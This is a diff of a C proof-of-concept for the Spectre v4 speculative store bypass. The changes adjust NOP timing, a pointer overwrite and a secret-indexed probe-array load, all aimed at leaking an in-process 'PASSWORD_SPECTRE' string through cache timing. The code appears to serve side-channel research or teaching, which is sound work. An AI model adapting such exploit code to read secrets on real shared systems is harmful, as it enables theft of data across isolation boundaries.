@@ -25,7 +25,7 @@
 
 unsigned char** memory_slot_ptr[256] __attribute__((aligned(4096)));
 unsigned char* memory_slot[256] __attribute__((aligned(4096)));
-
+static unsigned char cache_miss = 0;
 unsigned char secret_key[] = "PASSWORD_SPECTRE";
 unsigned char public_key[] = "################";
 unsigned char *password;
@@ -65,10 +65,11 @@ static inline __attribute__((always_inline)) void measure_time() {
 	}
 
 static inline __attribute__((always_inline)) void spectre_v4(size_t idx) {
-	unsigned char **memory_slot_slow_ptr = *memory_slot_ptr;
-	NOPS(200);
-	*memory_slot_slow_ptr = public_key;
-	tmp = probe[(*memory_slot)[idx] << 12];
+	//unsigned char **memory_slot_slow_ptr = memory_slot_ptr[0];
+	NOPS(20);
+	*(memory_slot_ptr[0]) = public_key;
+	NOPS(800);
+	tmp = probe[(memory_slot[0])[idx] << 12];
 	//measure_time();
 }
 
@@ -123,10 +124,9 @@ int main(void) {
 	probe = (unsigned char *)mmap(0, 4096 * 256, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
 	memset(probe, 0, sizeof(uint8_t) * 256 * 4096);
 	password = (unsigned char *)malloc(sizeof(unsigned char) * LEN);
-//	for(int j = 0; j < 256; j++){
-//		memory_slot_ptr[j] = &memory_slot[j];
-//	}
-	memory_slot_ptr = memory_slot;
+	for(int j = 0; j < 256; j++){
+		memory_slot_ptr[j] = &memory_slot[j];
+	}
 
 	int idx = 0;
 	REPEAT_16(
